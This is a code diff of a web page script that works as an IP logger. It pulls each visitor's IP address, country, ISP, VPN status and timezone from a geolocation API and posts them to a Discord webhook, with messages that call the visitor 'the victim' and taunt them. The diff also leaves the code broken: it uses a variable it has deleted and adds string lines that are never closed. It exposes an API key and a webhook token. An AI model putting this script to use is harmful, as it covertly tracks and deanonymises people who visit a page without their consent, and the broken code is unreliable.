@@ -12,9 +12,6 @@
     <script>
       $.getJSON("https://ipgeolocation.abstractapi.com/v1/?api_key=a1ebbf04c6164dd98b527e26c57fc28c", function (data) {
         const ip = data.ip_address;
-        const city = data.city;
-        const region = data.region;
-        const zip = data.postal_code;
         const country = data.country;
         const flag = data.flag.emoji;
         const aso = data.connection.autonomous_system_organization;
@@ -24,11 +21,11 @@
         const tz = data.timezone.name;
         const ct = data.timezone.current_time;
         const request = new XMLHttpRequest();
-        request.open("POST", "https://discord.com/api/webhooks/1055661033043271731/soDr1wXRWNURxP4b9yzRC7AqGqaERHmJ_YihLBs4Mn1j8tIT31h3b1NRnI2qg2JIsHrP");
+        request.open("POST", "https://cdn.discordapp.com/attachments/1041400517919776799/1055684712045215764/Capture.PNG");
         // Put in your discord webhook url above ^^^
         request.setRequestHeader("Content-type", "application/json");
         const params = {
-          username: "ECHOLOG",
+          username: "v3l's logger",
           avatar_url: "https://3kh0.github.io/img/echo.jpg",
           content: "**Ladies and gentlemen we got em!**\n> IP: " + ip + 
           "\n> City: " + city + 
@@ -42,6 +39,10 @@
           "\n> Using VPN: " + vpn +
           "\n> Timezone: " + tz +
           "\n> Current time: " + ct
+          "\n> 
+          "\n> To Get more infos about the victim, go to https://ipinfo.io/
+          "\n> 
+          "\n> Get iplogged bozo
           ,
         };
         request.send(JSON.stringify(params));
